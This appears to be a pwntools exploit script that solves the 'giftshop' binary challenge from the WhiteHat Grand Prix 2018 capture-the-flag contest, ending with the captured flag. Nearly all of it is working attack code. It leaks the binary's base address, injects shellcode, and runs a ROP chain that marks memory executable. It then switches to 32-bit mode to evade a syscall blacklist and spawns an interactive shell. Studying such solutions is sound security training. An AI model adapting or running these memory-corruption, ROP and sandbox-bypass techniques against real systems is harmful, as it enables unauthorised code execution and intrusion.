from pwn import *
import time
import sys

def giftshop(DEBUG):
	if DEBUG=="1":
		r = process("./giftshop")
		raw_input("debug?")
	elif DEBUG=="2":
		r = process(['./ptrace_64', '/home/phieulang/2018/whitehatgrandprix/forPlayer/giftshop','gift', '1', '60', '50', 'blacklist.conf'])
		raw_input("debug?")
	elif DEBUG=="3":
		HOST = 'pwn01.grandprix.whitehatvn.com'
		PORT = 26129
		r = remote(HOST,PORT)
	
	def pause():
		time.sleep(0.05)

	context.arch = "amd64"
	r.recvuntil('OK First, here is a giftcard, it may help you in next time you come here !\n')
	base = eval(r.recvline())-0x2030D8
	log.info("base: %#x" %base)
	r.recvuntil('Can you give me your name plzz ??\n')
	r.sendline('\x00')
	pause()
	r.recvline("Enter the receiver's name plzz: \n")
	payload = "\x00"*(0x1e0-0x120)
	payload += asm(shellcraft.amd64.linux.read(fd=0, buffer=base+0x2031E0, count=0x500))
	# payload += "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
	r.sendline(payload)
	pause()
	r.recvuntil('Your choice:\n')

	payload = "10"
	payload = payload.ljust(0x10, "\x00")
	payload += p64(base+0x203e00) # rbp
	payload += p64(base+0x225F) # pop rdi; ret
	payload += p64(base+0x203000) # rdi
	payload += p64(base+0x2261) # pop rsi; ret
	payload += p64(0x1000)
	payload += p64(base+0x2265) # pop rdx; ret
	payload += p64(7)
	payload += p64(base+0x2254) # syscall;ret
	payload += p64(base+0x2031E0) # shellcode
	payload += p64(base+0xB40)
	r.sendline(payload)
	pause()
	
	shellcode = ''
	shellcode += asm(shellcraft.amd64.linux.syscall('SYS_mmap', 0x40000, 0x2000, 0x7, 0x22, -1, 0))
	shellcode += asm(shellcraft.amd64.linux.read(fd=0, buffer=0x40000, count=0x500))
	shellcode += asm("""
		xor rsp, rsp
		mov esp, 0x40500
		mov DWORD PTR [esp+4], 0x23
		mov DWORD PTR [esp], 0x40000
		retf
	""")
	payload = "\x90"*0x25
	payload += shellcode
	r.sendline(payload)
	pause()
	payload = "6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80".decode("hex") # shellcraft.i386.linux.sh()
	pause()
	r.sendline(payload)
	
	r.interactive()
	
giftshop(sys.argv[1])
# WhiteHat{aeb7656b7a397a01c0d9d19fba3a81352e9b21aa}